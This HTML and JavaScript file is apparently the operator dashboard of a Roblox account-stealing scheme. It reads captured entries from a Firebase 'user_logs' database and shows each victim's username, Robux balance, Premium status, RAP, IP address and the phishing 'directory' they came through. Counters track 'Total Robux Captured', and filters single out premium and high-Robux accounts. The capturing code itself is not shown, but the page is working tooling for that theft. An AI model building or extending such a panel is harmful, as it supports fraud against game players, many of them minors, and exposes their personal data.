
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - Live Monitoring</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 50%, #0f0f23 100%);
            color: #fff;
            min-height: 100vh;
            padding: 20px;
        }
        
        .dashboard-container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .header h1 {
            font-size: 2.5rem;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: rgba(25, 25, 40, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 20px;
            text-align: center;
        }
        
        .stat-value {
            font-size: 2rem;
            font-weight: bold;
            color: #4A90E2;
            margin-bottom: 5px;
        }
        
        .stat-label {
            color: #B8BCC8;
            font-size: 0.9rem;
        }
        
        .logs-container {
            background: rgba(25, 25, 40, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 20px;
            max-height: 600px;
            overflow-y: auto;
        }
        
        .logs-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .log-entry {
            background: rgba(20, 20, 30, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 10px;
            animation: slideIn 0.3s ease-out;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .log-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .username {
            font-weight: bold;
            color: #4A90E2;
        }
        
        .timestamp {
            color: #6B7280;
            font-size: 0.8rem;
        }
        
        .log-details {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
            font-size: 0.9rem;
        }
        
        .detail-item {
            color: #B8BCC8;
        }
        
        .detail-value {
            color: #fff;
            font-weight: 500;
        }
        
        .status-indicator {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #4ade80;
            display: inline-block;
            margin-right: 8px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .filter-controls {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        
        .filter-btn {
            background: rgba(74, 144, 226, 0.2);
            border: 1px solid #4A90E2;
            color: #4A90E2;
            padding: 8px 16px;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .filter-btn:hover, .filter-btn.active {
            background: #4A90E2;
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="dashboard-container">
        <div class="header">
            <h1>üî• Live Admin Dashboard</h1>
            <p>Real-time monitoring of user activity</p>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value" id="totalUsers">0</div>
                <div class="stat-label">Total Users Today</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalRobux">0</div>
                <div class="stat-label">Total Robux Captured</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="premiumUsers">0</div>
                <div class="stat-label">Premium Users</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="activeDirectories">0</div>
                <div class="stat-label">Active Directories</div>
            </div>
        </div>
        
        <div class="logs-container">
            <div class="logs-header">
                <h3><span class="status-indicator"></span>Live User Logs</h3>
                <div class="filter-controls">
                    <button class="filter-btn active" onclick="filterLogs('all')">All</button>
                    <button class="filter-btn" onclick="filterLogs('premium')">Premium Only</button>
                    <button class="filter-btn" onclick="filterLogs('high-robux')">High Robux</button>
                </div>
            </div>
            <div id="logsContainer">
                <p style="text-align: center; color: #6B7280; margin: 40px 0;">Waiting for user activity...</p>
            </div>
        </div>
    </div>

    <script type="module">
        // Firebase configuration (you'll need to add your Firebase config here)
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js';
        import { getDatabase, ref, onValue, query, orderByChild, limitToLast } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js';

        // Your Firebase configuration
        const firebaseConfig = {
            databaseURL: "YOUR_FIREBASE_DB_URL" // Replace with your actual Firebase Realtime Database URL
        };

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);

        let currentFilter = 'all';
        let allLogs = [];

        // Listen for new user logs
        const logsRef = ref(database, 'user_logs');
        const logsQuery = query(logsRef, orderByChild('timestamp'), limitToLast(50));

        onValue(logsQuery, (snapshot) => {
            const data = snapshot.val();
            if (data) {
                allLogs = Object.values(data).reverse();
                updateStats();
                displayLogs(filterLogsByType(allLogs, currentFilter));
            }
        });

        function updateStats() {
            const today = new Date().toDateString();
            const todayLogs = allLogs.filter(log => {
                const logDate = new Date(log.timestamp).toDateString();
                return logDate === today;
            });

            document.getElementById('totalUsers').textContent = todayLogs.length;
            document.getElementById('totalRobux').textContent = todayLogs.reduce((sum, log) => sum + (log.robux || 0), 0).toLocaleString();
            document.getElementById('premiumUsers').textContent = todayLogs.filter(log => log.premium).length;

            // Count unique directories
            const directories = new Set(todayLogs.map(log => log.directory));
            document.getElementById('activeDirectories').textContent = directories.size;
        }

        function displayLogs(logs) {
            const container = document.getElementById('logsContainer');
            
            if (logs.length === 0) {
                container.innerHTML = '<p style="text-align: center; color: #6B7280; margin: 40px 0;">No logs match the current filter...</p>';
                return;
            }

            container.innerHTML = logs.map(log => `
                <div class="log-entry">
                    <div class="log-header">
                        <span class="username">${log.username || 'Unknown'}</span>
                        <span class="timestamp">${new Date(log.timestamp).toLocaleString()}</span>
                    </div>
                    <div class="log-details">
                        <div class="detail-item">Robux: <span class="detail-value">${(log.robux || 0).toLocaleString()}</span></div>
                        <div class="detail-item">Premium: <span class="detail-value">${log.premium ? '‚úÖ' : '‚ùå'}</span></div>
                        <div class="detail-item">RAP: <span class="detail-value">${(log.rap || 0).toLocaleString()}</span></div>
                        <div class="detail-item">Directory: <span class="detail-value">${log.directory || 'main'}</span></div>
                        ${log.subdirectory ? `<div class="detail-item">Subdirectory: <span class="detail-value">${log.subdirectory}</span></div>` : ''}
                        <div class="detail-item">IP: <span class="detail-value">${log.ip || 'Unknown'}</span></div>
                    </div>
                </div>
            `).join('');
        }

        function filterLogsByType(logs, type) {
            switch(type) {
                case 'premium':
                    return logs.filter(log => log.premium);
                case 'high-robux':
                    return logs.filter(log => (log.robux || 0) >= 1000);
                default:
                    return logs;
            }
        }

        window.filterLogs = function(type) {
            currentFilter = type;
            
            // Update active button
            document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            
            displayLogs(filterLogsByType(allLogs, type));
        };
    </script>
</body>
</html>
